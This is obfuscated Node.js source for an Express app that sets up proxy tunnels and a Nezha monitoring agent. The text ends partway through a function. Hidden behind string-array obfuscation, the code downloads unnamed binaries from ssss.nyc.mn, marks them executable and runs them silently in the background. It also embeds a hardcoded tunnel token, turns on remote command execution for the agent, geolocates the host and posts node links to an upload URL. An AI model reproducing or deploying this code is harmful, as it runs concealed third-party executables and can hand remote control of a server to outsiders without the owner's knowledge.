const _0x1631e5=_0x307d;(function(_0x176e53,_0x46fce8){const _0x3a3061={_0x5ce96f:0xe0,_0x19b3ed:0xbb,_0xdf7885:0x135,_0x50dd20:0xc9,_0x48a6cc:0x116,_0x240c28:0x149,_0x2f6f00:0xf5},_0xd882fa=_0x307d,_0x61a9b8=_0x176e53();while(!![]){try{const _0x29eb82=-parseInt(_0xd882fa(0x98))/0x1*(parseInt(_0xd882fa(_0x3a3061._0x5ce96f))/0x2)+parseInt(_0xd882fa(0xa6))/0x3*(-parseInt(_0xd882fa(_0x3a3061._0x19b3ed))/0x4)+-parseInt(_0xd882fa(0xc2))/0x5*(-parseInt(_0xd882fa(0xc6))/0x6)+-parseInt(_0xd882fa(0xe2))/0x7*(parseInt(_0xd882fa(_0x3a3061._0xdf7885))/0x8)+parseInt(_0xd882fa(_0x3a3061._0x50dd20))/0x9+-parseInt(_0xd882fa(_0x3a3061._0x48a6cc))/0xa*(parseInt(_0xd882fa(_0x3a3061._0x240c28))/0xb)+-parseInt(_0xd882fa(0xea))/0xc*(-parseInt(_0xd882fa(_0x3a3061._0x2f6f00))/0xd);if(_0x29eb82===_0x46fce8)break;else _0x61a9b8['push'](_0x61a9b8['shift']());}catch(_0x39d953){_0x61a9b8['push'](_0x61a9b8['shift']());}}}(_0x40b5,0x4474c));const express=require(_0x1631e5(0x142)),app=express(),axios=require(_0x1631e5(0xcb)),os=require('os'),fs=require('fs'),path=require(_0x1631e5(0xa3)),{promisify}=require(_0x1631e5(0x141)),exec=promisify(require('child_process')[_0x1631e5(0x148)]),UPLOAD_URL=process[_0x1631e5(0x86)][_0x1631e5(0x115)]||'',PROJECT_URL=process[_0x1631e5(0x86)][_0x1631e5(0xfa)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x1631e5(0x86)][_0x1631e5(0x127)]||'.tmp',SUB_PATH=process[_0x1631e5(0x86)][_0x1631e5(0xc0)]||'sub',PORT=process[_0x1631e5(0x86)][_0x1631e5(0x121)]||process['env'][_0x1631e5(0x14d)]||0xbb8,UUID=process[_0x1631e5(0x86)][_0x1631e5(0xf4)]||_0x1631e5(0x10e),NEZHA_SERVER=process[_0x1631e5(0x86)][_0x1631e5(0x89)]||'',NEZHA_PORT=process['env'][_0x1631e5(0xba)]||'',NEZHA_KEY=process[_0x1631e5(0x86)][_0x1631e5(0xd7)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x1631e5(0xf2),ARGO_AUTH=process[_0x1631e5(0x86)][_0x1631e5(0xb2)]||'eyJhIjoiYmU2NTA5YWRjZjk3ZTc3NGVhMTFkMzgwYzdjZWM4OTkiLCJ0IjoiOTc1ZDczMTAtNzczMS00OGYzLWJhN2EtM2NmODZkMGI2YmRiIiwicyI6Ik9URXlNRGs1TnpJdFltSmxPUzAwTkRrNExUbGhZekl0WlRZek1tTTJaalpqWlRWayJ9',ARGO_PORT=process[_0x1631e5(0x86)][_0x1631e5(0x123)]||0x1f41,CFIP=process['env'][_0x1631e5(0xa4)]||'saas.sin.fan',CFPORT=process[_0x1631e5(0x86)][_0x1631e5(0x12c)]||0x1bb,NAME=process[_0x1631e5(0x86)]['NAME']||_0x1631e5(0x13c);function _0x307d(_0x4bba31,_0x427017){const _0x40b5b7=_0x40b5();return _0x307d=function(_0x307d94,_0x312e69){_0x307d94=_0x307d94-0x86;let _0x373df9=_0x40b5b7[_0x307d94];return _0x373df9;},_0x307d(_0x4bba31,_0x427017);}!fs['existsSync'](FILE_PATH)?(fs[_0x1631e5(0x128)](FILE_PATH),console[_0x1631e5(0x99)](FILE_PATH+_0x1631e5(0x134))):console[_0x1631e5(0x99)](FILE_PATH+_0x1631e5(0x108));function generateRandomName(){const _0x2424f6={_0x4482d3:0xff,_0xa92037:0x133},_0x3615ca=_0x1631e5,_0x16b338=_0x3615ca(_0x2424f6._0x4482d3);let _0x493175='';for(let _0x71719=0x0;_0x71719<0x6;_0x71719++){_0x493175+=_0x16b338[_0x3615ca(0x8a)](Math['floor'](Math['random']()*_0x16b338[_0x3615ca(_0x2424f6._0xa92037)]));}return _0x493175;}function _0x40b5(){const _0x5d50c3=['https://amd64.ssss.nyc.mn/web','2xffcEb','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','119jcAuUO','utf8','catch','Subscription\x20uploaded\x20successfully','arch','basename','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','844860pNeYIl','org','message','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','statSync','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','application/json','/api/add-nodes','northf.xay.cc.cd','NEZHA\x20variable\x20is\x20empty,skip\x20running','UUID','52TyhmLN','\x0aclient_secret:\x20','base64','2096','https://amd64.ssss.nyc.mn/v1','PROJECT_URL','status','existsSync','\x20failed:\x20','.exe\x20>\x20nul\x202>&1','abcdefghijklmnopqrstuvwxyz','match','Error\x20reading\x20boot.log:','/trojan-argo','countryCode','/vmess-argo?ed=2560','443','\x0a\x0atrojan://','?encryption=none&security=tls&sni=','\x20already\x20exists','/vmess-argo','readdirSync','ARGO_DOMAIN:','arm','&fp=firefox&type=ws&host=','2402137c-3814-4fb2-ac08-00735f7895f5','includes','promises','Error\x20downloading\x20files:','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/api/add-subscriptions','tunnel.json','UPLOAD_URL','10vsDKYe','tls','get','/config.json\x20>/dev/null\x202>&1\x20&','\x22\x20>\x20/dev/null\x202>&1','&path=%2Ftrojan-argo%3Fed%3D2560#','https://arm64.ssss.nyc.mn/agent','\x0a\x0avmess://','Empowerment\x20success\x20for\x20','direct','tunnel.yml','SERVER_PORT','push','ARGO_PORT','config.json','\x20>/dev/null\x202>&1\x20&','isFile','FILE_PATH','mkdirSync','listen','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','isp','CFPORT','Nodes\x20uploaded\x20successfully','stringify','freedom','App\x20is\x20running','unlink','from','length','\x20is\x20created','3960liTYMT','http\x20server\x20is\x20running\x20on\x20port:','send','unshift','Mozilla/5.0','/sub.txt\x20saved\x20successfully','\x0a\x20\x20\x20\x20','northflank','Add\x20automatic\x20access\x20task\x20faild:\x20','/dev/null','Download\x20','clear','util','express','error','Error\x20in\x20startserver:','xtls-rprx-vision','/vless-argo','\x20-c\x20','exec','2801161qxzTfi','aarch64','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','taskkill\x20/f\x20/im\x20','PORT','readFileSync','env','2083','\x0a\x20\x20tunnel:\x20','NEZHA_SERVER','charAt','boot.log','\x20-s\x20','utf-8','auto','all','post','then','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','split','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https://oooo.serv00.net/add-url','country_code','sub.txt','165286udqKKR','log','vmess','response','\x20-c\x20\x22','amd','8443','?security=tls&sni=','blackhole','arm64','https://arm64.ssss.nyc.mn/v1','path','CFIP','https://api.ip.sb/geoip','15846aYsExC','\x0avless://','127.0.0.1','tcp','pipe','success','filter','readFile','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Unknown','https://arm64.ssss.nyc.mn/web','forEach','ARGO_AUTH','https://arm64.ssss.nyc.mn/bot','join','data','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Unhandled\x20error\x20in\x20startserver:','quic','TunnelSecret','NEZHA_PORT','148yTdNYB','block','2053','\x20is\x20running','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','SUB_PATH','Error\x20executing\x20command:\x20','5PmbCgZ','&path=%2Fvless-argo%3Fed%3D2560#','finish','createWriteStream','1773606TBcwoi','false','del\x20/f\x20/q\x20','2942649dSKZmS','win32','axios','http://ip-api.com/json','writeFileSync','text/plain;\x20charset=utf-8','nohup\x20','http','pop','rm\x20-rf\x20','test','toString','unlinkSync','trojan','NEZHA_KEY','stream','replace','platform','https://amd64.ssss.nyc.mn/agent','npm\x20running\x20error:\x20','none','2087'];_0x40b5=function(){return _0x5d50c3;};return _0x40b5();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1631e5(0xb4)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x1631e5(0xb4)](FILE_PATH,webName),botPath=path[_0x1631e5(0xb4)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x1631e5(0x97)),listPath=path[_0x1631e5(0xb4)](FILE_PATH,'list.txt'),bootLogPath=path[_0x1631e5(0xb4)](FILE_PATH,'boot.log'),configPath=path[_0x1631e5(0xb4)](FILE_PATH,_0x1631e5(0x124));function deleteNodes(){const _0x5312d2={_0x111673:0x132,_0x1d6334:0x8d,_0x404853:0xac,_0x5efc05:0x90,_0x4a5b1c:0xe4},_0x3070ff=_0x1631e5;try{if(!UPLOAD_URL)return;if(!fs[_0x3070ff(0xfc)](subPath))return;let _0x433430;try{_0x433430=fs[_0x3070ff(0x14e)](subPath,_0x3070ff(0x8d));}catch{return null;}const _0xa2d2d3=Buffer[_0x3070ff(_0x5312d2._0x111673)](_0x433430,'base64')['toString'](_0x3070ff(_0x5312d2._0x1d6334)),_0x3064b3=_0xa2d2d3['split']('\x0a')[_0x3070ff(_0x5312d2._0x404853)](_0x3768a9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3768a9));if(_0x3064b3[_0x3070ff(0x133)]===0x0)return;return axios[_0x3070ff(_0x5312d2._0x5efc05)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x3064b3}),{'headers':{'Content-Type':'application/json'}})[_0x3070ff(_0x5312d2._0x4a5b1c)](_0x1fcfc7=>{return null;}),null;}catch(_0x18f3f4){return null;}}function cleanupOldFiles(){const _0x2fde60={_0x41166d:0x10a},_0xff8f02={_0x334186:0xb4,_0x44df03:0x126,_0x10e188:0xd5},_0x5f4c4e=_0x1631e5;try{const _0x5a2f03=fs[_0x5f4c4e(_0x2fde60._0x41166d)](FILE_PATH);_0x5a2f03[_0x5f4c4e(0xb1)](_0x365a2a=>{const _0xbd6231=_0x5f4c4e,_0x136cc7=path[_0xbd6231(_0xff8f02._0x334186)](FILE_PATH,_0x365a2a);try{const _0x44530b=fs[_0xbd6231(0xee)](_0x136cc7);_0x44530b[_0xbd6231(_0xff8f02._0x44df03)]()&&fs[_0xbd6231(_0xff8f02._0x10e188)](_0x136cc7);}catch(_0xfa6910){}});}catch(_0x5430a0){}}async function generateConfig(){const _0x2563b5={_0x4f9965:0x13e,_0x6ed093:0xdd,_0x13d66c:0xa8,_0x17c6ad:0xa9,_0x1506ac:0xdd,_0x2669fd:0xa8,_0x6e3c0f:0x146,_0x363410:0xd0,_0x697721:0x9a,_0x91c0e7:0xb8,_0x55b1f9:0xd6,_0x3a6702:0x12f,_0x5818fd:0xa0,_0x5021c7:0xbc,_0xb5928c:0x12e},_0x1e0550=_0x1631e5,_0x45b05b={'log':{'access':_0x1e0550(0x13e),'error':_0x1e0550(_0x2563b5._0x4f9965),'loglevel':_0x1e0550(_0x2563b5._0x6ed093)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x1e0550(0x145)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x1e0550(0x146),'dest':0xbba},{'path':_0x1e0550(0x109),'dest':0xbbb},{'path':_0x1e0550(0x102),'dest':0xbbc}]},'streamSettings':{'network':_0x1e0550(0xa9)}},{'port':0xbb9,'listen':_0x1e0550(_0x2563b5._0x13d66c),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x1e0550(0xdd)},'streamSettings':{'network':_0x1e0550(_0x2563b5._0x17c6ad),'security':_0x1e0550(_0x2563b5._0x1506ac)}},{'port':0xbba,'listen':_0x1e0550(_0x2563b5._0x2669fd),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1e0550(0xdd)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x1e0550(_0x2563b5._0x6e3c0f)}},'sniffing':{'enabled':!![],'destOverride':[_0x1e0550(_0x2563b5._0x363410),_0x1e0550(0x117),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x1e0550(_0x2563b5._0x697721),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1e0550(0x109)}},'sniffing':{'enabled':!![],'destOverride':[_0x1e0550(0xd0),'tls',_0x1e0550(_0x2563b5._0x91c0e7)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1e0550(0xa8),'protocol':_0x1e0550(_0x2563b5._0x55b1f9),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x1e0550(0x102)}},'sniffing':{'enabled':!![],'destOverride':[_0x1e0550(0xd0),'tls',_0x1e0550(0xb8)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x1e0550(_0x2563b5._0x3a6702),'tag':_0x1e0550(0x11f)},{'protocol':_0x1e0550(_0x2563b5._0x5818fd),'tag':_0x1e0550(_0x2563b5._0x5021c7)}]};fs[_0x1e0550(0xcd)](path['join'](FILE_PATH,_0x1e0550(0x124)),JSON[_0x1e0550(_0x2563b5._0xb5928c)](_0x45b05b,null,0x2));}function getSystemArchitecture(){const _0x327123={_0x5e2e36:0x10c,_0x3b3183:0x14a,_0x44e724:0x9d},_0x16b963=_0x1631e5,_0x540d46=os[_0x16b963(0xe6)]();return _0x540d46===_0x16b963(_0x327123._0x5e2e36)||_0x540d46===_0x16b963(0xa1)||_0x540d46===_0x16b963(_0x327123._0x3b3183)?_0x16b963(0x10c):_0x16b963(_0x327123._0x44e724);}function downloadFile(_0x17dfdf,_0x369f01,_0x511d41){const _0x3e9dce={_0x5b5a9b:0x128,_0x4868b2:0x91},_0x463895={_0x328f2e:0xec},_0x4bd8cb={_0x35fd2b:0xaa,_0x295986:0xc4},_0xfc754=_0x1631e5,_0x4ca4fe=_0x17dfdf;!fs[_0xfc754(0xfc)](FILE_PATH)&&fs[_0xfc754(_0x3e9dce._0x5b5a9b)](FILE_PATH,{'recursive':!![]});const _0x1c7455=fs[_0xfc754(0xc5)](_0x4ca4fe);axios({'method':_0xfc754(0x118),'url':_0x369f01,'responseType':_0xfc754(0xd8)})[_0xfc754(_0x3e9dce._0x4868b2)](_0xd88552=>{const _0x25ed20={_0x2a0f5b:0x131,_0x380d6c:0x13f,_0x3e6879:0x143},_0x1c6544=_0xfc754;_0xd88552[_0x1c6544(0xb5)][_0x1c6544(_0x4bd8cb._0x35fd2b)](_0x1c7455),_0x1c7455['on'](_0x1c6544(_0x4bd8cb._0x295986),()=>{const _0x169620=_0x1c6544;_0x1c7455['close'](),console[_0x169620(0x99)]('Download\x20'+path[_0x169620(0xe7)](_0x4ca4fe)+'\x20successfully'),_0x511d41(null,_0x4ca4fe);}),_0x1c7455['on']('error',_0x32e865=>{const _0x324ce9=_0x1c6544;fs[_0x324ce9(_0x25ed20._0x2a0f5b)](_0x4ca4fe,()=>{});const _0x5e4fd3=_0x324ce9(_0x25ed20._0x380d6c)+path[_0x324ce9(0xe7)](_0x4ca4fe)+_0x324ce9(0xfd)+_0x32e865[_0x324ce9(0xec)];console[_0x324ce9(_0x25ed20._0x3e6879)](_0x5e4fd3),_0x511d41(_0x5e4fd3);});})['catch'](_0x32b84d=>{const _0x169761=_0xfc754,_0x2f7c2a=_0x169761(0x13f)+path['basename'](_0x4ca4fe)+_0x169761(0xfd)+_0x32b84d[_0x169761(_0x463895._0x328f2e)];console[_0x169761(0x143)](_0x2f7c2a),_0x511d41(_0x2f7c2a);});}async function downloadFilesAndRun(){const _0x1d277d={_0x2e7545:0x111,_0x2f0159:0xd1,_0x5a95b1:0x105,_0x1d091a:0xf8,_0xc48918:0xbd,_0x3eae9a:0xf6,_0x3e3802:0x12a,_0x47d632:0xb4,_0x243b87:0x9c,_0x25dc1e:0xef,_0x329e65:0x143,_0x29e2cb:0x10f,_0x36f7f0:0xcf,_0x547116:0x8c,_0x43163f:0x99,_0x50dc2b:0xdc,_0x408973:0xcf,_0x14228f:0x119,_0x14354b:0xbe,_0xaad6fb:0x100,_0x378345:0x125,_0x42dec1:0xbe},_0x2899be={_0x9da629:0xb1},_0x84cde1=_0x1631e5,_0x53a453=getSystemArchitecture(),_0x4c5116=getFilesForArchitecture(_0x53a453);if(_0x4c5116['length']===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x137122=_0x4c5116['map'](_0x222645=>{return new Promise((_0x3f4fe5,_0x4510f9)=>{downloadFile(_0x222645['fileName'],_0x222645['fileUrl'],(_0x479f07,_0x3f031a)=>{_0x479f07?_0x4510f9(_0x479f07):_0x3f4fe5(_0x3f031a);});});});try{await Promise[_0x84cde1(0x8f)](_0x137122);}catch(_0x27b809){console[_0x84cde1(0x143)](_0x84cde1(_0x1d277d._0x2e7545),_0x27b809);return;}function _0x24ae3e(_0x3695c5){const _0x4ae1a8={_0xa8c0c9:0xfc},_0x306a61=_0x84cde1,_0x525f7d=0x1fd;_0x3695c5[_0x306a61(_0x2899be._0x9da629)](_0x3fe196=>{const _0x40400e=_0x306a61;fs[_0x40400e(_0x4ae1a8._0xa8c0c9)](_0x3fe196)&&fs['chmod'](_0x3fe196,_0x525f7d,_0x37afb2=>{const _0x20495b=_0x40400e;_0x37afb2?console[_0x20495b(0x143)]('Empowerment\x20failed\x20for\x20'+_0x3fe196+':\x20'+_0x37afb2):console[_0x20495b(0x99)](_0x20495b(0x11e)+_0x3fe196+':\x20'+_0x525f7d[_0x20495b(0xd4)](0x8));});});}const _0xbcd8d6=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x24ae3e(_0xbcd8d6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xf60aac=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x84cde1(_0x1d277d._0x2f0159)]():'',_0x135b75=new Set([_0x84cde1(_0x1d277d._0x5a95b1),'8443',_0x84cde1(_0x1d277d._0x1d091a),_0x84cde1(0xde),_0x84cde1(0x87),_0x84cde1(_0x1d277d._0xc48918)]),_0x2bb0ec=_0x135b75['has'](_0xf60aac)?'true':_0x84cde1(0xc7),_0x3f1c1b=_0x84cde1(_0x1d277d._0x3eae9a)+NEZHA_KEY+_0x84cde1(_0x1d277d._0x3e3802)+NEZHA_SERVER+_0x84cde1(0xae)+_0x2bb0ec+_0x84cde1(0xe1)+UUID;fs['writeFileSync'](path[_0x84cde1(_0x1d277d._0x47d632)](FILE_PATH,'config.yaml'),_0x3f1c1b);const _0x103f15=_0x84cde1(0xcf)+phpPath+_0x84cde1(_0x1d277d._0x243b87)+FILE_PATH+_0x84cde1(_0x1d277d._0x25dc1e);try{await exec(_0x103f15),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x1f004f=>setTimeout(_0x1f004f,0x3e8));}catch(_0x3d2f40){console[_0x84cde1(_0x1d277d._0x329e65)]('php\x20running\x20error:\x20'+_0x3d2f40);}}else{let _0x12f8fe='';const _0x541991=[_0x84cde1(0x105),_0x84cde1(0x9e),_0x84cde1(_0x1d277d._0x1d091a),'2087',_0x84cde1(0x87),_0x84cde1(_0x1d277d._0xc48918)];_0x541991[_0x84cde1(_0x1d277d._0x29e2cb)](NEZHA_PORT)&&(_0x12f8fe='--tls');const _0x487ec1=_0x84cde1(_0x1d277d._0x36f7f0)+npmPath+_0x84cde1(_0x1d277d._0x547116)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x12f8fe+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x487ec1),console[_0x84cde1(_0x1d277d._0x43163f)](npmName+'\x20is\x20running'),await new Promise(_0x517a0c=>setTimeout(_0x517a0c,0x3e8));}catch(_0x1dc076){console['error'](_0x84cde1(_0x1d277d._0x50dc2b)+_0x1dc076);}}}else console[_0x84cde1(0x99)](_0x84cde1(0xf3));const _0x4c0da3=_0x84cde1(_0x1d277d._0x408973)+webPath+_0x84cde1(0x147)+FILE_PATH+_0x84cde1(_0x1d277d._0x14228f);try{await exec(_0x4c0da3),console['log'](webName+_0x84cde1(_0x1d277d._0x14354b)),await new Promise(_0x423e53=>setTimeout(_0x423e53,0x3e8));}catch(_0xddfad2){console[_0x84cde1(_0x1d277d._0x329e65)]('web\x20running\x20error:\x20'+_0xddfad2);}if(fs['existsSync'](botPath)){let _0xae5fc;if(ARGO_AUTH[_0x84cde1(_0x1d277d._0xaad6fb)](/^[A-Z0-9a-z=]{120,250}$/))_0xae5fc=_0x84cde1(0xe9)+ARGO_AUTH;else ARGO_AUTH[_0x84cde1(0x100)](/TunnelSecret/)?_0xae5fc='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0xae5fc='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x84cde1(0x94)+ARGO_PORT;try{await exec(_0x84cde1(0xcf)+botPath+'\x20'+_0xae5fc+_0x84cde1(_0x1d277d._0x378345)),console[_0x84cde1(0x99)](botName+_0x84cde1(_0x1d277d._0x42dec1)),await new Promise(_0x15f9be=>setTimeout(_0x15f9be,0x7d0));}catch(_0x4b8edd){console[_0x84cde1(_0x1d277d._0x329e65)](_0x84cde1(0xc1)+_0x4b8edd);}}await new Promise(_0x74392c=>setTimeout(_0x74392c,0x1388));}function getFilesForArchitecture(_0x4c9788){const _0x5849c8={_0x285efe:0x10c,_0x4ee022:0xdf,_0xae889d:0x11c,_0xc1f29:0x138,_0x2218e9:0xf9},_0xec9721=_0x1631e5;let _0x12e0ea;_0x4c9788===_0xec9721(_0x5849c8._0x285efe)?_0x12e0ea=[{'fileName':webPath,'fileUrl':_0xec9721(0xb0)},{'fileName':botPath,'fileUrl':_0xec9721(0xb3)}]:_0x12e0ea=[{'fileName':webPath,'fileUrl':_0xec9721(_0x5849c8._0x4ee022)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x44d4c4=_0x4c9788===_0xec9721(0x10c)?_0xec9721(_0x5849c8._0xae889d):_0xec9721(0xdb);_0x12e0ea[_0xec9721(_0x5849c8._0xc1f29)]({'fileName':npmPath,'fileUrl':_0x44d4c4});}else{const _0x2677f8=_0x4c9788===_0xec9721(_0x5849c8._0x285efe)?_0xec9721(0xa2):_0xec9721(_0x5849c8._0x2218e9);_0x12e0ea[_0xec9721(0x138)]({'fileName':phpPath,'fileUrl':_0x2677f8});}}return _0x12e0ea;}function argoType(){const _0x540212={_0x3c745d:0xb9,_0x13a49d:0xb4,_0x38c568:0x114,_0x22c1c0:0x88,_0x27ec31:0x93,_0x505cc2:0xb6,_0x5368f3:0xcd,_0xf581a4:0xe8},_0x5d4b37=_0x1631e5;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x5d4b37(0x10f)](_0x5d4b37(_0x540212._0x3c745d))){fs[_0x5d4b37(0xcd)](path[_0x5d4b37(_0x540212._0x13a49d)](FILE_PATH,_0x5d4b37(_0x540212._0x38c568)),ARGO_AUTH);const _0x38d80f=_0x5d4b37(_0x540212._0x22c1c0)+ARGO_AUTH[_0x5d4b37(_0x540212._0x27ec31)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x5d4b37(0xb4)](FILE_PATH,_0x5d4b37(0x114))+_0x5d4b37(0x112)+ARGO_DOMAIN+_0x5d4b37(0xed)+ARGO_PORT+_0x5d4b37(_0x540212._0x505cc2);fs[_0x5d4b37(_0x540212._0x5368f3)](path[_0x5d4b37(0xb4)](FILE_PATH,_0x5d4b37(0x120)),_0x38d80f);}else console['log'](_0x5d4b37(_0x540212._0xf581a4));}async function extractDomains(){const _0x52e11f={_0x2a6e67:0x14e,_0x195148:0x93,_0x96f249:0xb1,_0x4cc112:0xbf,_0x4e269f:0xd5,_0x2dbe5f:0x94,_0x1daf99:0xcf,_0x4e814c:0x125,_0x5717db:0xbe,_0x3f0b7b:0x143,_0x1080c:0x101},_0x4d4a04={_0xfed721:0xa5,_0x40aac9:0x139,_0x1a51b2:0xb5,_0x3af1fb:0xb5,_0x21b619:0xb5,_0x1ff087:0x12b,_0x38a3da:0x118,_0x40b1c8:0x103,_0x1a72b5:0xeb,_0x20eecf:0xd9},_0x46d97c={_0x94585c:0x14c,_0x48124f:0xfe},_0x11c4fa={_0x4fc0ee:0x100,_0x4d33eb:0x122},_0x26403f=_0x1631e5;let _0x3eb1b6;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3eb1b6=ARGO_DOMAIN,console[_0x26403f(0x99)](_0x26403f(0x10b),_0x3eb1b6),await _0x5ef01b(_0x3eb1b6);else try{const _0x2a965e=fs[_0x26403f(_0x52e11f._0x2a6e67)](path['join'](FILE_PATH,'boot.log'),_0x26403f(0x8d)),_0x5b2ed5=_0x2a965e[_0x26403f(_0x52e11f._0x195148)]('\x0a'),_0x2b21da=[];_0x5b2ed5[_0x26403f(_0x52e11f._0x96f249)](_0x4baa7a=>{const _0x17ac0a=_0x26403f,_0x550ae5=_0x4baa7a[_0x17ac0a(_0x11c4fa._0x4fc0ee)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x550ae5){const _0x275b37=_0x550ae5[0x1];_0x2b21da[_0x17ac0a(_0x11c4fa._0x4d33eb)](_0x275b37);}});if(_0x2b21da[_0x26403f(0x133)]>0x0)_0x3eb1b6=_0x2b21da[0x0],console[_0x26403f(0x99)]('ArgoDomain:',_0x3eb1b6),await _0x5ef01b(_0x3eb1b6);else{console[_0x26403f(0x99)](_0x26403f(_0x52e11f._0x4cc112)),fs[_0x26403f(_0x52e11f._0x4e269f)](path['join'](FILE_PATH,_0x26403f(0x8b)));async function _0x28e2f2(){const _0x3e7ca0=_0x26403f;try{process[_0x3e7ca0(0xda)]==='win32'?await exec(_0x3e7ca0(_0x46d97c._0x94585c)+botName+_0x3e7ca0(_0x46d97c._0x48124f)):await exec('pkill\x20-f\x20\x22['+botName[_0x3e7ca0(0x8a)](0x0)+']'+botName['substring'](0x1)+_0x3e7ca0(0x11a));}catch(_0x468099){}}_0x28e2f2(),await new Promise(_0x223209=>setTimeout(_0x223209,0xbb8));const _0x269739=_0x26403f(0x14b)+FILE_PATH+_0x26403f(_0x52e11f._0x2dbe5f)+ARGO_PORT;try{await exec(_0x26403f(_0x52e11f._0x1daf99)+botPath+'\x20'+_0x269739+_0x26403f(_0x52e11f._0x4e814c)),console[_0x26403f(0x99)](botName+_0x26403f(_0x52e11f._0x5717db)),await new Promise(_0x3b53fe=>setTimeout(_0x3b53fe,0xbb8)),await extractDomains();}catch(_0x32cc06){console[_0x26403f(_0x52e11f._0x3f0b7b)](_0x26403f(0xc1)+_0x32cc06);}}}catch(_0x306caf){console[_0x26403f(0x143)](_0x26403f(_0x52e11f._0x1080c),_0x306caf);}async function _0x252831(){const _0x414ee3=_0x26403f;try{const _0x56e5cb=await axios['get'](_0x414ee3(_0x4d4a04._0xfed721),{'headers':{'User-Agent':_0x414ee3(_0x4d4a04._0x40aac9),'timeout':0xbb8}});if(_0x56e5cb[_0x414ee3(0xb5)]&&_0x56e5cb[_0x414ee3(_0x4d4a04._0x1a51b2)]['country_code']&&_0x56e5cb[_0x414ee3(_0x4d4a04._0x3af1fb)]['isp'])return(_0x56e5cb[_0x414ee3(_0x4d4a04._0x21b619)][_0x414ee3(0x96)]+'-'+_0x56e5cb['data'][_0x414ee3(_0x4d4a04._0x1ff087)])['replace'](/\s+/g,'_');}catch(_0xfbc47f){try{const _0x28eb39=await axios[_0x414ee3(_0x4d4a04._0x38a3da)](_0x414ee3(0xcc),{'headers':{'User-Agent':_0x414ee3(0x139),'timeout':0xbb8}});if(_0x28eb39[_0x414ee3(_0x4d4a04._0x21b619)]&&_0x28eb39[_0x414ee3(_0x4d4a04._0x1a51b2)][_0x414ee3(0xfb)]===_0x414ee3(0xab)&&_0x28eb39[_0x414ee3(0xb5)][_0x414ee3(_0x4d4a04._0x40b1c8)]&&_0x28eb39[_0x414ee3(0xb5)][_0x414ee3(_0x4d4a04._0x1a72b5)])return(_0x28eb39[_0x414ee3(0xb5)][_0x414ee3(0x103)]+'-'+_0x28eb39['data']['org'])[_0x414ee3(_0x4d4a04._0x20eecf)](/\s+/g,'_');}catch(_0x190d14){}}return _0x414ee3(0xaf);}async function 